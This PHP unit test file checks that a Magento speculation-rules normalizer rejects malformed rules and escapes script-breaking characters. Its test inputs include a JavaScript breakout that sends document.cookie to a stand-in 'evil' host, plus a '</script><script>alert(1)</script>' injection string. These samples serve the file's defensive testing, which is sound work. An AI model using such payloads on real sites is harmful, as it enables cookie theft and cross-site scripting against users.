<?php

namespace Swissup\SpeculationRules\Test\Unit\Model;

use PHPUnit\Framework\Attributes\DataProvider;
use Magento\Framework\Serialize\Serializer\Json;
use PHPUnit\Framework\TestCase;
use Swissup\SpeculationRules\Model\RulesNormalizer;

class RulesNormalizerTest extends TestCase
{
    public static function invalidProvider(): array
    {
        return [
            'javascript breakout'  => ['{}; fetch("//evil/"+document.cookie); ({}'],
            'single quoted object' => ["{'prerender': []}"],
            'empty'                => [''],
            'whitespace'           => ["  \n"],
            'scalar'               => ['"prerender"'],
            'list'                 => ['[{"source":"list"}]'],
            'trailing comma'       => ['{"a": 1,}'],
        ];
    }

    #[DataProvider('invalidProvider')]
    public function testInvalidRulesAreDropped(string $rules): void
    {
        $this->assertSame('', (new RulesNormalizer(new Json()))->normalize($rules));
    }

    public function testScriptBreakoutInsideStringsIsEscaped(): void
    {
        $rules = '{"prerender":[{"source":"list","urls":["</script><script>alert(1)</script>","a\'b&c"]}]}';
        $json = (new RulesNormalizer(new Json()))->normalize($rules);

        $this->assertStringNotContainsString('<', $json);
        $this->assertStringNotContainsString('>', $json);
        $this->assertStringNotContainsString("'", $json);
        $this->assertStringNotContainsString('&', $json);
        $this->assertEquals(json_decode($rules), json_decode($json));
    }

    public function testBackslashBeforeAngleBracketStaysEscaped(): void
    {
        $rules = '{"a":"\\\\<\\/script>"}';
        $json = (new RulesNormalizer(new Json()))->normalize($rules);

        $this->assertStringNotContainsString('<', $json);
        $this->assertEquals(json_decode($rules), json_decode($json));
    }

    public function testValidRulesKeepTheirMeaning(): void
    {
        $rules = '{"prerender":[{"source":"document","where":{"href_matches":"/*"},"eagerness":"moderate"}],"x":{}}';
        $json = (new RulesNormalizer(new Json()))->normalize($rules);

        $this->assertEquals(json_decode($rules), json_decode($json));
        $this->assertStringContainsString('"x":{}', $json);
    }
}
